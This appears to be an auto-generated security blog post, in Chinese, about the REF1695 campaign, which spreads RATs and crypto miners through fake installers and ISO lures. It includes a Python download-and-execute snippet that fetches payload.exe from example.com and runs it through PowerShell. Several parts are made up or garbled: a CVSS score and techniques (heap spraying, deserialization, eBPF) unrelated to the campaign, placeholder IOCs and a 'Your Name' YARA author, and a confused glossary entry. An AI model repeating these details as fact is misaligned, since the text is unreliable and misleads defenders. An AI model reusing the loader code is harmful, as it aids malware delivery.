---
layout: post
title:  "Researchers Uncover Mining Operation Using ISO Lures to Spread RATs and Crypto Miners"
date:   2026-04-02 12:56:47 +0000
categories: [security]
severity: critical
---

# 🚨 解析 REF1695 金融動機攻擊行動：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: REF1695 攻擊行動利用假的安裝程式部署遠端存取木馬 (RATs) 和加密貨幣挖礦程式。攻擊者利用 ISO 檔案作為感染向量，下載並執行額外的有效載荷，更新自己，並執行清除動作以掩蓋其行蹤。
* **攻擊流程圖解**:
  1. 使用者下載並執行假的安裝程式。
  2. 安裝程式下載並執行 .NET Reactor-protected loader。
  3. Loader 啟動 PowerShell，配置 Microsoft Defender Antivirus 排除設定，以避免被偵測。
  4. PowerShell 啟動 CNB Bot，CNB Bot 下載並執行額外的有效載荷。
* **受影響元件**: Windows 10、Windows Server 2019、.NET Framework 4.8

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 管理員權限、網路連接
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載有效載荷
    payload_url = "https://example.com/payload.exe"
    response = requests.get(payload_url)
    
    # 執行有效載荷
    with open("payload.exe", "wb") as f:
        f.write(response.content)
    
    # 啟動 PowerShell
    import subprocess
    subprocess.run(["powershell.exe", "-Command", "Start-Process payload.exe"])
    
    ```
* **繞過技術**: 使用 `WinRing0x64.sys` 驅動程式獲得核心級別的硬體存取權限，修改 CPU 設定以提高哈希率。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | `1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `example.com` |
| File Path | `C:\Windows\Temp\payload.exe` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule REF1695 {
        meta:
            description = "REF1695 攻擊行動"
            author = "Your Name"
        strings:
            $a = "payload.exe"
            $b = "https://example.com/payload.exe"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 更新 Windows 和 .NET Framework，啟用 Microsoft Defender Antivirus，設定防火牆規則以阻止未知的網路連接。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying**: 一種攻擊技術，利用堆疊溢位漏洞在記憶體中創建大量的物件，以增加攻擊成功的機會。
* **Deserialization**: 將序列化的資料轉換回原始的物件或結構。
* **eBPF**: 一種 Linux 核心技術，允許用戶空間程式碼在核心空間中執行。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/researchers-uncover-mining-operation.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


